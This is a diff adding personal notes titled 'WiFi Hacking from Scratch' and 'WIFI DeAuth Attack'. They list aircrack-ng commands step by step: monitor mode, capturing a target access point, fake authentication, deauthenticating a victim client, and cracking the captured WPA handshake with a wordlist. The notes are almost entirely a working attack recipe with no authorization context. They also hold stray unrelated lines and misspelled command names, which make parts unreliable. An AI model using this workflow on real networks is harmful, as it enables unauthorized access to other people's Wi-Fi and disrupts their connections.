@@ -1,0 +1,77 @@
+
+*************************************WiFi Hacking from Scratch******************************
+
+iwconfig -> to check wireless interface status
+dmesg |  grep 8187 ->  driver loaded for wireless
+iw list -> to check which ieee we are using 
+rmmod r_no -> to unload current driver (r_no==driver_no)
+modprobe rtl_no ->  to load the driver
+iwconfig -> to check wireless interface status and driver is cofigured correctly
+iw list | less -> list of detailed info about wireless driver
+iw dev wlan0 scan | grep "SSID" -> to get lis of wireless access point our interface scan can detect
+iwlist wlam0 frequency -> to lising the wireless channel numbers and corresponding frequencies
+iw dev wlan0 scan | egrep "DS\ Parameter\ Set|SSID" -> to see what channels access point transmitting on
+iw dev wlan0 interface add mon0 type monitor -> to add mon0 vap
+ifconfig mon0 up -> to make interface up
+iwconfig -> to check wireless interface status
+tcpdump -i mon0 -s 650000 -p -> to verify our card is in monitor mode by using tcpdump
+iw dev mon0 interface del  -> to delete vap
+iw dev wlan0 scanning | egrep "ESSID"
+iw dev wlan0 scanning | egrep "ESSID|Channel"
+iwconfig wlan0 mode monitor channel 3 -> to up monitor mode on channel 3 on wlan0
+ifconfig wlan0 up -> to make interface up
+tcpdump -i wlan0 -s 650000 -p -> to verify our wlan0 is in monitor mode by using tcpdump
+iwconfig wlan0 mode managed -> to take card outoff monitor mode
+
+
+airmon-ng -> current interface status
+airmon-ng check -> to check any process which can be problamatic while testing
+airmon-ng check kill -> to kill the process which can be problamtic
+airmon-ng start wlan0 -> to put our card into monitor mode
+airmon-ng stop mon0 -> to disbale monitor mode
+airmon-ng start wlan0 3 -> to start monitor mode on specific channel (3==channel_no)
+iw list mon0 channel -> to see mon0 mode to channel 3 (3==channel_no)
+
+
+
+BSSID -> contain mac address of access points
+#DATA ->  number of initialization vector that arrow dump has captured
+#/s -> rate at which data packets are collected
+ENC -> what encryption type is used in the access point
+CIPHER -> what cipher is detected on encrypted network
+AUTH -> authentication protocol in use
+STATION -> contain mac address of the visible clients
+
+airdump-ng -> packet capture of raw wireless frame and used vap initialization vector for later use with aircrack-ng
+airdump-ng mon0 -> to see which network are within our reach of wireless cart
+airdump-ng -c 3 mon0 -> packet capture of channel 3 
+echo air > info
+echo VIC=client_macaddress >>  info
+macchanger -s mon0  ->  to check our own mac address
+echo MON=own_macaddress >>  info
+airodum-ng -c 3 --bssid mac_value_access_point -w file_save_capture and interface_name (3==channel_no) -> to capture the details on the access point
+
+aireplay-ng -> to generate or accelerate traffic for the later use with aircrack-ng, it supports various attcks such as de-authentication, packet injection, fake authentication, interactive packet replay.
+aireplay -9 interface_name(mon0) -> to injection test
+aireplay-ng -1 0 -e essid -a macaddress_ap -h our_own_macaddress -> fake authentication attack
+
+aireplay-ng -0 1 -a maccaddress_ap -c macaddress_victim interface_name(wlan0) -> de-authenticate attack on victims wifi
+
+
+
+
+
+
+
+Unable to sign in. Please check your connection and try again.
+194.61.40.0/24 
+--------------Pratap Notes WIFI DeAuth Attack-------------
+ 
+ 
+iwconfig	[Check for wlan interface and the mode]
+sudo airmon-ng start <wlanX>	[give wlan interface to enable monitor mode] 
+iwconfig	[Confirm that wlan has entered monitor mode or not]
+sudo airodump-ng <wlanX>	[Check the access points, BSSID's, Channels, etc. nearby]
+sudo airodump-ng --channel <Channel_ID> --bssid <BSSID> -w <PathToSaveHandshakeDump> <wlanX interface>	[Keep running to search for 4-way Handshake] 
+sudo aireplay-ng -0 10 -a <BSSID> <wlanX interface>	[Perform the Deauth]
+sudo aircrack-ng -b <BSSID> <HandShake .cap file> -w <wordlist to crack>	[Cracking handshake to get password]
